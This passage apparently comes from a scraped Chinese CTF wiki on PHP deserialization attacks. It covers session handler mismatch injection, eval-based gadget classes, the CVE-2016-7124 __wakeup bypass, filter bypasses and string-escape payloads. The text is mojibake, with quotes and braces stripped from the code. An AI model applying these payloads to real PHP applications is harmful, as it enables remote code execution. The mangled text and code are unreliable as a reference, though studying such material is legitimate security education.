**phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚**å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionid(PHPSESSID)æ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–ä¹‹åçš„å†…å®¹ã€‚å‡è®¾æˆ‘ä»¬çš„ç¯å¢ƒæ˜¯xamppï¼Œé‚£ä¹ˆé»˜è®¤é…ç½®å¦‚ä¸Šæ‰€è¿°ã€‚ åœ¨é»˜è®¤é…ç½®æƒ…å†µä¸‹ï¼ˆåœ¨phpå¼•æ“ä¸‹ï¼šï¼‰ï¼š php ?phpsession_start() // session_start()ä¼šåˆ›å»ºæ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯$_SESSION[name] = spoock;var_dump();? å¯ä»¥çœ‹åˆ°PHPSESSIDçš„å€¼æ˜¯jo86ud4jfvu81mbg28sl2s56c2ï¼Œæ‰€ä»¥åœ¨xampptmpä¸‹å­˜å‚¨çš„æ–‡ä»¶åæ˜¯sess_jo86ud4jfvu81mbg28sl2s56c2ï¼Œæ–‡ä»¶çš„å†…å®¹æ˜¯name|s:6:spoock; ã€‚nameæ˜¯é”®å€¼ï¼Œs:6:spoock;æ˜¯serialize(spoock)çš„ç»“æœï¼ˆphpå¼•æ“æ–¹å¼å­˜å‚¨ï¼šé”®å+ç«–çº¿ |+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼ï¼‰ã€‚ åœ¨php_serializeå¼•æ“ä¸‹ï¼š php ?phpini_set(session.serialize_handler, php_serialize); // è®¾ç½®åºåˆ—åŒ–å¼•æ“ä½¿ç”¨php_serializesession_start(); // å¯åŠ¨æ–°ä¼šè¯æˆ–è€…é‡ç”¨ç°æœ‰ä¼šè¯ $_SESSION[name] = spoock; var_dump();? SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯a:1:{s:4:name;s:6:spoock;} ã€‚a:1æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„key(é”®)å’Œvalue(å€¼)éƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚ åœ¨php_binaryå¼•æ“ä¸‹ï¼šå­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ php ?phpini_set(session.serialize_handler, php_binary);session_start();$_SESSION[name] = spoock;var_dump();? SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯names:6:spoock; ã€‚ç”±äºnameçš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯EOTï¼ˆè¿™ä¸ªï¼‰ã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯names:6:spoock; ã€‚(çªç„¶å‘ç°ASCIIçš„å€¼ä¸º4çš„å­—ç¬¦æ— æ³•åœ¨ç½‘é¡µä¸Šé¢æ˜¾ç¤ºï¼Œè¿™ä¸ªå¤§å®¶è‡ªè¡Œå»æŸ¥ASCIIè¡¨å§) SESSIONåºåˆ—åŒ–æ¼æ´åˆ©ç”¨php ?phpclass syclover var $func=; function __construct() // __construct()åœ¨å®ä¾‹åŒ–æ˜¯è¢«è°ƒç”¨ $this-func = phpinfo(); function __wakeup() eval($this-func); unserialize($_GET[a]);? åœ¨11è¡Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†ååºåˆ—åŒ–ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ å…¥ä¸€ä¸ªç‰¹å®šçš„å­—ç¬¦ä¸²ï¼Œååºåˆ—åŒ–ä¸ºsycloverçš„ä¸€ä¸ªç¤ºä¾‹ï¼Œé‚£ä¹ˆå°±å¯ä»¥æ‰§è¡Œeval()æ–¹æ³•ã€‚æˆ‘ä»¬è®¿é—®localhost/test.php?a=O:8:syclover:1:{s:4:func;s:14:echo spoock;;} ã€‚é‚£ä¹ˆååºåˆ—åŒ–å¾—åˆ°çš„å†…å®¹æ˜¯ï¼š php object(syclover)[1] public func = string echo spoock; (length=14) **æœ€åé¡µé¢è¾“å‡ºçš„å°±æ˜¯spoockï¼Œè¯´æ˜æœ€åæ‰§è¡Œäº†æˆ‘ä»¬å®šä¹‰çš„echo â€œspoockâ€;æ–¹æ³•ã€‚**è¿™å°±æ˜¯ä¸€ä¸ªç®€å•çš„åºåˆ—åŒ–çš„æ¼æ´çš„æ¼”ç¤º PHP SESSIONä¸­çš„åºåˆ—åŒ–å±å®³PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜çš„ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚**å¦‚æœè®¾ç½®çš„sessionåºåˆ—åŒ–é€‰æ‹©å™¨ä¸é»˜è®¤çš„ä¸åŒçš„è¯å°±å¯èƒ½ä¼šäº§ç”Ÿæ¼æ´ï¼ˆä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®çš„ååºåˆ—åŒ–ï¼‰ã€‚**é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ä¾‹å¦‚: php $_SESSION[spoock] = |O:11:PeopleClass:0:; ä¸Šè¿°çš„$_SESSIONçš„æ•°æ®å¦‚æœä½¿ç”¨php_serializeï¼Œé‚£ä¹ˆæœ€åçš„å­˜å‚¨çš„å†…å®¹å°±æ˜¯a:1:{s:6:spoock;s:24:|O:11:PeopleClass:0:{};} ã€‚ ä½†æ˜¯æˆ‘ä»¬åœ¨è¿›è¡Œè¯»å–çš„æ—¶å€™ï¼Œå¦‚æœé€‰æ‹©çš„æ˜¯phpï¼Œé‚£ä¹ˆæœ€åè¯»å–çš„å†…å®¹æ˜¯ï¼š php array (size=1) a:1:s:6:spoock;s:24: = object(__PHP_Incomplete_Class)[1] public __PHP_Incomplete_Class_Name = string PeopleClass (length=11) è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥ç«–æ  | ä½œä¸ºä½œä¸ºkey(é”®)å’Œvalue(å€¼)çš„åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†a:1:{s:6:â€œspoockâ€;s:24:â€ä½œä¸ºSESSIONçš„key(é”®)ï¼Œå°†O:11:â€œPeopleClassâ€:0:{}ä½œä¸ºvalue(å€¼)ï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°PeopleClasè¿™ä¸ªç±»ã€‚ è¿™ç§ç”±äºåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ‰€ä½¿ç”¨çš„ä¸ä¸€æ ·çš„å¼•æ“å°±æ˜¯é€ æˆPHP Sessionåºåˆ—è¯æ¼æ´çš„åŸå› ã€‚ å®é™…åˆ©ç”¨å­˜åœ¨s1.phpå’Œus2.phpè¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œ2ä¸ªæ–‡ä»¶æ‰€ä½¿ç”¨çš„SESSIONçš„å¼•æ“ä¸ä¸€æ ·ï¼Œå°±å½¢æˆäº†ä¸€ä¸ªæ¼æ´ã€‚ s1.phpï¼Œä½¿ç”¨php_serializeæ¥å¤„ç†session php ?phpini_set(session.serialize_handler, php_serialize);session_start();$_SESSION[spoock]=$_GET[a]; us2.phpï¼Œä½¿ç”¨phpæ¥å¤„ç†session php ini_set(session.serialize_handler, php);`localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;`session_start();class lemon var $hi; function __construct() $this-hi = phpinfo();; function __destruct() eval($this-hi); // O:5:lemon:1:s:2:hi;s:14:echo spoock;; æ­¤é¢˜åœ¨s1.phpä¸­æœ‰å¯ä»¥ä¼ å…¥sessionçš„ç‚¹ï¼Œæ‰€ä»¥å°±ä¸ç”¨æ„é€ è¡¨å•äº†ï¼Œè¿™é¢˜çš„çªç ´ç‚¹åœ¨å“ªé‡Œï¼Œæ²¡é”™ï¼Œå°±æ˜¯æˆ‘å¤‡æ³¨çš„é‚£å—s2.phpä¸­ini_set(session.serialize_handler, php);ï¼Œé€‰æ‹©sessionåºåˆ—åŒ–å¤„ç†å™¨ã€‚ å½“è®¿é—®s1.phpæ—¶ï¼Œæäº¤å¦‚ä¸‹çš„æ•°æ®å¹¶å­˜å‚¨åˆ°sessionæ–‡ä»¶ä¸­ï¼š php localhost/s1.php?a=|O:5:lemon:1:s:2:hi;s:14:echo spoock;;1 æ­¤æ—¶ä¼ å…¥çš„æ•°æ®ä¼šæŒ‰ç…§php_serializeæ¥è¿›è¡Œåºåˆ—åŒ–ï¼Œç”±s2.phpè¯»å–æ—¶æŒ‰ç…§phpæ¥ååºåˆ—åŒ–ã€‚ O:5:â€œlemonâ€:1:{s:2:â€œhiâ€;s:14:â€œecho â€œspoockâ€;â€;}ç”±ä»¥ä¸‹åºåˆ—åŒ–æ¥å¾—åˆ°ï¼Œåœ¨åŠ ä¸Šä¸€ä¸ªç«–æ  |å°±è¡Œäº† php ?phpclass lemon public $hi=xxxxx;$obj = new lemon();echo serialize($obj);?xxxxxå¤„æŒ‰ç…§ä½ æƒ³æ‰§è¡Œçš„ä»£ç æ¥å¡«å†™ï¼Œè¿™é‡Œå¡«çš„æ˜¯echo spoock æ­¤æ—¶è®¿é—®us2.phpæ—¶ï¼Œé¡µé¢è¾“å‡ºï¼ŒspoockæˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬æ„é€ çš„å‡½æ•°ã€‚å› ä¸ºåœ¨è®¿é—®us2.phpæ—¶ï¼Œç¨‹åºä¼šæŒ‰ç…§phpæ¥ååºåˆ—åŒ–SESSIONä¸­çš„æ•°æ®ï¼Œæ­¤æ—¶å°±ä¼šååºåˆ—åŒ–ä¼ªé€ çš„æ•°æ®ï¼Œå°±ä¼šå®ä¾‹åŒ–lemonå¯¹è±¡ï¼Œæœ€åå°±ä¼šæ‰§è¡Œææ„å‡½æ•°ä¸­çš„eval()æ–¹æ³•ã€‚"},{"title":"java","path":"/wiki/WP/ååºåˆ—åŒ–/java/index.html","content":""},{"title":"phpååºåˆ—åŒ–","path":"/wiki/WP/ååºåˆ—åŒ–/php/phpååºåˆ—åŒ–.html","content":"PHPååºåˆ—åŒ–è¿™ä¸€ç¯‡å°±å¤Ÿäº†ç®€ä»‹åºåˆ—åŒ–å…¶å®å°±æ˜¯å°†æ•°æ®è½¬åŒ–æˆä¸€ç§å¯é€†çš„æ•°æ®ç»“æ„ï¼Œè‡ªç„¶ï¼Œé€†å‘çš„è¿‡ç¨‹å°±å«åšååºåˆ—åŒ–ã€‚ åœ¨ç½‘ä¸Šæ‰¾åˆ°ä¸€ä¸ªæ¯”è¾ƒå½¢è±¡çš„ä¾‹å­ æ¯”å¦‚ï¼šç°åœ¨æˆ‘ä»¬éƒ½ä¼šåœ¨æ·˜å®ä¸Šä¹°æ¡Œå­ï¼Œæ¡Œå­è¿™ç§å¾ˆä¸è§„åˆ™çš„ä¸œè¥¿ï¼Œè¯¥æ€ä¹ˆä»ä¸€ä¸ªåŸå¸‚è¿è¾“åˆ°å¦ä¸€ä¸ªåŸå¸‚ï¼Œè¿™æ—¶å€™ä¸€èˆ¬éƒ½ä¼šæŠŠå®ƒæ‹†æ‰æˆæ¿å­ï¼Œå†è£…åˆ°ç®±å­é‡Œé¢ï¼Œå°±å¯ä»¥å¿«é€’å¯„å‡ºå»äº†ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±ç±»ä¼¼æˆ‘ä»¬çš„åºåˆ—åŒ–çš„è¿‡ç¨‹ï¼ˆæŠŠæ•°æ®è½¬åŒ–ä¸ºå¯ä»¥å­˜å‚¨æˆ–è€…ä¼ è¾“çš„å½¢å¼ï¼‰ã€‚å½“ä¹°å®¶æ”¶åˆ°è´§åï¼Œå°±éœ€è¦è‡ªå·±æŠŠè¿™äº›æ¿å­ç»„è£…æˆæ¡Œå­çš„æ ·å­ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±åƒååºåˆ—çš„è¿‡ç¨‹ï¼ˆè½¬åŒ–æˆå½“åˆçš„æ•°æ®å¯¹è±¡ï¼‰ã€‚ php å°†æ•°æ®åºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¼šç”¨åˆ°ä¸¤ä¸ªå‡½æ•° serialize å°†å¯¹è±¡æ ¼å¼åŒ–æˆæœ‰åºçš„å­—ç¬¦ä¸² unserialize å°†å­—ç¬¦ä¸²è¿˜åŸæˆåŸæ¥çš„å¯¹è±¡ åºåˆ—åŒ–çš„ç›®çš„æ˜¯æ–¹ä¾¿æ•°æ®çš„ä¼ è¾“å’Œå­˜å‚¨ï¼Œåœ¨PHPä¸­ï¼Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–ä¸€èˆ¬ç”¨åšç¼“å­˜ï¼Œæ¯”å¦‚sessionç¼“å­˜ï¼Œcookieç­‰ã€‚ å¸¸è§çš„åºåˆ—åŒ–æ ¼å¼äº†è§£å³å¯ äºŒè¿›åˆ¶æ ¼å¼ å­—èŠ‚æ•°ç»„ jsonå­—ç¬¦ä¸² xmlå­—ç¬¦ä¸² æ¡ˆä¾‹å¼•å…¥ç®€å•çš„ä¾‹å­(ä»¥æ•°ç»„ä¸ºä¾‹å­) ?php$user=array(xiao,shi,zi);$user=serialize($user);echo($user.PHP_EOL);print_r(unserialize($user)); ä»–ä¼šè¾“å‡º a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;Array( [0] = xiao [1] = shi [2] = zi) æˆ‘ä»¬å¯¹ä¸Šé¢è¿™ä¸ªä¾‹å­åšä¸ªç®€å•è®²è§£ï¼Œæ–¹ä¾¿å¤§å®¶å…¥é—¨ a:3:i:0;s:4:xiao;i:1;s:3:shi;i:2;s:2:zi;a:arrayä»£è¡¨æ˜¯æ•°ç»„ï¼Œåé¢çš„3è¯´æ˜æœ‰ä¸‰ä¸ªå±æ€§i:ä»£è¡¨æ˜¯æ•´å‹æ•°æ®intï¼Œåé¢çš„0æ˜¯æ•°ç»„ä¸‹æ ‡s:ä»£è¡¨æ˜¯å­—ç¬¦ä¸²ï¼Œåé¢çš„4æ˜¯å› ä¸ºxiaoé•¿åº¦ä¸º4 ä¾æ¬¡ç±»æ¨ åºåˆ—åŒ–åçš„å†…å®¹åªæœ‰æˆå‘˜å˜é‡ï¼Œæ²¡æœ‰æˆå‘˜å‡½æ•°ï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­ ?phpclass test public $a; public $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);? è¾“å‡º(Oä»£è¡¨Objectæ˜¯å¯¹è±¡çš„æ„æ€ï¼Œä¹Ÿæ˜¯ç±») O:4:test:2:s:1:a;s:9:xiaoshizi;s:1:b;s:8:laoshizi; è€Œå¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00,privateåˆ™ä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00ç±»å\\x00,è¾“å‡ºæ—¶ä¸€èˆ¬éœ€è¦urlç¼–ç ï¼Œè‹¥åœ¨æœ¬åœ°å­˜å‚¨æ›´æ¨èé‡‡ç”¨base64ç¼–ç çš„å½¢å¼ï¼Œå¦‚ä¸‹ï¼š ?phpclass test protected $a; private $b; function __construct()$this-a = xiaoshizi;$this-b=laoshizi; function happy()return $this-a;$a = new test();echo serialize($a);echo urlencode(serialize($a));? è¾“å‡ºåˆ™ä¼šå¯¼è‡´ä¸å¯è§å­—ç¬¦\\x00çš„ä¸¢å¤± O:4:test:2:s:4: * a;s:9:xiaoshizi;s:7: test b;s:8:laoshizi; ååºåˆ—åŒ–ä¸­å¸¸è§çš„é­”æœ¯æ–¹æ³•__wakeup() //æ‰§è¡Œunserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__sleep() //æ‰§è¡Œserialize()æ—¶ï¼Œå…ˆä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®æˆ–è€…ä¸å­˜åœ¨è¿™ä¸ªé”®éƒ½ä¼šè°ƒç”¨æ­¤æ–¹æ³•__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ ååºåˆ—åŒ–ç»•è¿‡å°Trickphp7.1+ååºåˆ—åŒ–å¯¹ç±»å±æ€§ä¸æ•æ„Ÿæˆ‘ä»¬å‰é¢è¯´äº†å¦‚æœå˜é‡å‰æ˜¯protectedï¼Œåºåˆ—åŒ–ç»“æœä¼šåœ¨å˜é‡åå‰åŠ ä¸Š\\x00*\\x00 ä½†åœ¨ç‰¹å®šç‰ˆæœ¬7.1ä»¥ä¸Šåˆ™å¯¹äºç±»å±æ€§ä¸æ•æ„Ÿï¼Œæ¯”å¦‚ä¸‹é¢çš„ä¾‹å­å³ä½¿æ²¡æœ‰\\x00*\\x00ä¹Ÿä¾ç„¶ä¼šè¾“å‡ºabc ?phpclass test protected $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a; unserialize(O:4:test:1:s:1:a;s:3:abc;); ç»•è¿‡__wakeup(CVE-2016-7124) ç‰ˆæœ¬ï¼š PHP5 5.6.25 PHP7 7.0.10 åˆ©ç”¨æ–¹å¼ï¼šåºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ å¯¹äºä¸‹é¢è¿™æ ·ä¸€ä¸ªè‡ªå®šä¹‰ç±» ?phpclass test public $a; public function __construct() $this-a = abc; public function __wakeup() $this-a=666; public function __destruct() echo $this-a; å¦‚æœæ‰§è¡Œunserialize(O:4:test:1:{s:1:a;s:3:abc;});è¾“å‡ºç»“æœä¸º666 è€ŒæŠŠå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¢å¤§æ‰§è¡Œunserialize(O:4:test:2:{s:1:a;s:3:abc;});è¾“å‡ºç»“æœä¸ºabc ç»•è¿‡éƒ¨åˆ†æ­£åˆ™preg_match(/^O:\\d+/)åŒ¹é…åºåˆ—åŒ–å­—ç¬¦ä¸²æ˜¯å¦æ˜¯å¯¹è±¡å­—ç¬¦ä¸²å¼€å¤´,è¿™åœ¨æ›¾ç»çš„CTFä¸­ä¹Ÿå‡ºè¿‡ç±»ä¼¼çš„è€ƒç‚¹ åˆ©ç”¨åŠ å·ç»•è¿‡ï¼ˆæ³¨æ„åœ¨urlé‡Œä¼ å‚æ—¶+è¦ç¼–ç ä¸º%2Bï¼‰ serialize(array($ a)); $aä¸ºè¦ååºåˆ—åŒ–çš„å¯¹è±¡(åºåˆ—åŒ–ç»“æœå¼€å¤´æ˜¯aï¼Œä¸å½±å“ä½œä¸ºæ•°ç»„å…ƒç´ çš„$açš„ææ„) ?phpclass test public $a; public function __construct() $this-a = abc; public function __destruct() echo $this-a.PHP_EOL; function match($data) if (preg_match(/^O:\\d+/,$data)) die(you lose!); else return $data; $a = O:4:test:1:s:1:a;s:3:abc;;// +å·ç»•è¿‡$b = str_replace(O:4,O:+4, $a);unserialize(match($b));// serialize(array($a));unserialize(a:1:i:0;O:4:test:1:s:1:a;s:3:abc;); åˆ©ç”¨å¼•ç”¨?phpclass test public $a; public $b; public function __construct() $this-a = abc; $this-b= $this-a; public function __destruct() if($this-a===$this-b) echo 666; $a = serialize(new test()); ä¸Šé¢è¿™ä¸ªä¾‹å­å°†$bè®¾ç½®ä¸º$açš„å¼•ç”¨ï¼Œå¯ä»¥ä½¿$aæ°¸è¿œä¸$bç›¸ç­‰ 16è¿›åˆ¶ç»•è¿‡å­—ç¬¦çš„è¿‡æ»¤O:4:test:2:s:4:%00*%00a;s:3:abc;s:7:%00test%00b;s:3:def;å¯ä»¥å†™æˆO:4:test:2:S:4:\\00*\\00\\61;s:3:abc;s:7:%00test%00b;s:3:def;è¡¨ç¤ºå­—ç¬¦ç±»å‹çš„så¤§å†™æ—¶ï¼Œä¼šè¢«å½“æˆ16è¿›åˆ¶è§£æã€‚ æˆ‘è¿™é‡Œå†™äº†ä¸€ä¸ªä¾‹å­ ?phpclass test public $username; public function __construct() $this-username = admin; public function __destruct() echo 666; function check($data) if(stristr($data, username)!==False) echo(ä½ ç»•ä¸è¿‡ï¼ï¼.PHP_EOL); else return $data; // æœªä½œå¤„ç†å‰$a = O:4:test:1:s:8:username;s:5:admin;;$a = check($a);unserialize($a);// åšå¤„ç†å \\75æ˜¯uçš„16è¿›åˆ¶$a = O:4:test:1:S:8:\\\\75sername;s:5:admin;;$a = check($a);unserialize($a); PHPååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æƒ…å†µ1ï¼šè¿‡æ»¤åå­—ç¬¦å˜å¤šé¦–å…ˆç»™å‡ºæœ¬åœ°çš„phpä»£ç ï¼Œå¾ˆç®€å•ä¸åšè¿‡å¤šçš„è§£é‡Šï¼Œå°±æ˜¯æŠŠååºåˆ—åŒ–åçš„ä¸€ä¸ªxæ›¿æ¢æˆä¸ºä¸¤ä¸ª ?phpfunction change($str) return str_replace(x,xx,$str);$name = $_GET[name];$age = I am 11;$arr = array($name,$age);echo ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š;var_dump(serialize($arr));echo br/;echo è¿‡æ»¤å:;$old = change(serialize($arr));$new = unserialize($old);var_dump($new);echo br/æ­¤æ—¶ï¼Œage=$new[1]; æ­£å¸¸æƒ…å†µ,ä¼ å…¥name=mao å¦‚æœæ­¤æ—¶å¤šä¼ å…¥ä¸€ä¸ªxçš„è¯ä¼šæ€æ ·ï¼Œæ¯«æ— ç–‘é—®ååºåˆ—åŒ–å¤±è´¥ï¼Œç”±äºæº¢å‡º(sæœ¬æ¥æ˜¯4ç»“æœå¤šäº†ä¸€ä¸ªå­—ç¬¦å‡ºæ¥)ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸€ç‚¹å®ç°å­—ç¬¦ä¸²é€ƒé€¸ é¦–å…ˆæ¥çœ‹çœ‹ç»“æœï¼Œå†æ¥è®²è§£ æˆ‘ä»¬ä¼ å…¥name=maoxxxxxxxxxxxxxxxxxxxx;i:1;s:6:woaini;};i:1;s:6:woaini;}è¿™ä¸€éƒ¨åˆ†ä¸€å…±äºŒåä¸ªå­—ç¬¦ç”±äºä¸€ä¸ªxä¼šè¢«æ›¿æ¢ä¸ºä¸¤ä¸ªï¼Œæˆ‘ä»¬è¾“å…¥äº†ä¸€å…±20ä¸ªxï¼Œç°åœ¨æ˜¯40ä¸ªï¼Œå¤šå‡ºæ¥çš„20ä¸ªxå…¶å®å–ä»£äº†æˆ‘ä»¬çš„è¿™äºŒåä¸ªå­—ç¬¦;i:1;s:6:woaini;}ï¼Œä»è€Œé€ æˆ;i:1;s:6:woaini;}çš„æº¢å‡ºï¼Œè€Œé—­åˆäº†å‰ä¸²ï¼Œä½¿å¾—æˆ‘ä»¬çš„å­—ç¬¦ä¸²æˆåŠŸé€ƒé€¸ï¼Œå¯ä»¥è¢«ååºåˆ—åŒ–ï¼Œè¾“å‡ºwoainiæœ€åçš„;}é—­åˆååºåˆ—åŒ–å…¨è¿‡ç¨‹å¯¼è‡´åŸæ¥çš„;i:1;s:7:I am 11;}è¢«èˆå¼ƒï¼Œä¸å½±å“ååºåˆ—åŒ–è¿‡ç¨‹ æƒ…å†µ2ï¼šè¿‡æ»¤åå­—ç¬¦å˜å°‘è€è§„çŸ©å…ˆä¸Šä»£ç ,å¾ˆç®€å•ä¸åšè¿‡å¤šçš„è§£é‡Šï¼Œå°±æ˜¯æŠŠååºåˆ—åŒ–åçš„ä¸¤ä¸ªxæ›¿æ¢æˆä¸ºä¸€ä¸ª ?phpfunction change($str) return str_replace(xx,x,$str);$arr[name] = $_GET[name];$arr[age] = $_GET[age];echo ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š;var_dump(serialize($arr));echo br/;echo è¿‡æ»¤å:;$old = change(serialize($arr));var_dump($old);echo br/;$new = unserialize($old);var_dump($new);echo br/æ­¤æ—¶ï¼Œage=;echo $new[age]; æ­£å¸¸æƒ…å†µä¼ å…¥name=maoage=11çš„ç»“æœ è€è§„çŸ©çœ‹çœ‹æœ€åæ„é€ çš„ç»“æœï¼Œå†ç»§ç»­è®²è§£ ç®€å•æ¥è¯´ï¼Œå°±æ˜¯å‰é¢å°‘äº†ä¸€åŠï¼Œå¯¼è‡´åé¢çš„å­—ç¬¦è¢«åƒæ‰ï¼Œä»è€Œæ‰§è¡Œäº†æˆ‘ä»¬åé¢çš„ä»£ç ï¼›æˆ‘ä»¬æ¥çœ‹ï¼Œè¿™éƒ¨åˆ†æ˜¯ageåºåˆ—åŒ–åçš„ç»“æœ s:3:age;s:28:11;s:3:age;s:6:woaini;} ç”±äºå‰é¢æ˜¯40ä¸ªxæ‰€ä»¥å¯¼è‡´å°‘äº†20ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥éœ€è¦åé¢æ¥è¡¥ä¸Šï¼Œ;s:3:age;s:28:11è¿™ä¸€éƒ¨åˆ†åˆšå¥½20ä¸ªï¼Œåé¢ç”±äºæœ‰é—­åˆäº†å‰é¢å› æ­¤åé¢çš„å‚æ•°å°±å¯ä»¥ç”±æˆ‘ä»¬è‡ªå®šä¹‰æ‰§è¡Œäº† å¯¹è±¡æ³¨å…¥å½“ç”¨æˆ·çš„è¯·æ±‚åœ¨ä¼ ç»™ååºåˆ—åŒ–å‡½æ•°unserialize()ä¹‹å‰æ²¡æœ‰è¢«æ­£ç¡®çš„è¿‡æ»¤æ—¶å°±ä¼šäº§ç”Ÿæ¼æ´ã€‚å› ä¸ºPHPå…è®¸å¯¹è±¡åºåˆ—åŒ–ï¼Œæ”»å‡»è€…å°±å¯ä»¥æäº¤ç‰¹å®šçš„åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ç»™ä¸€ä¸ªå…·æœ‰è¯¥æ¼æ´çš„unserializeå‡½æ•°ï¼Œæœ€ç»ˆå¯¼è‡´ä¸€ä¸ªåœ¨è¯¥åº”ç”¨èŒƒå›´å†…çš„ä»»æ„PHPå¯¹è±¡æ³¨å…¥ã€‚ å¯¹è±¡æ¼æ´å‡ºç°å¾—æ»¡è¶³ä¸¤ä¸ªå‰æ 1ã€unserializeçš„å‚æ•°å¯æ§ã€‚2ã€ ä»£ç é‡Œæœ‰å®šä¹‰ä¸€ä¸ªå«æœ‰é­”æœ¯æ–¹æ³•çš„ç±»ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•é‡Œå‡ºç°ä¸€äº›ä½¿ç”¨ç±»æˆå‘˜å˜é‡ä½œä¸ºå‚æ•°çš„å­˜åœ¨å®‰å…¨é—®é¢˜çš„å‡½æ•°ã€‚ æ¯”å¦‚è¿™ä¸ªä¾‹å­ ?phpclass A var $test = y4mao; function __destruct() echo $this-test; $a = O:1:A:1:s:4:test;s:5:maomi;;unserialize($a); åœ¨è„šæœ¬è¿è¡Œç»“æŸåä¾¿ä¼šè°ƒç”¨_destructå‡½æ•°ï¼ŒåŒæ—¶ä¼šè¦†ç›–testå˜é‡è¾“å‡ºmaomi POPé“¾çš„æ„é€ 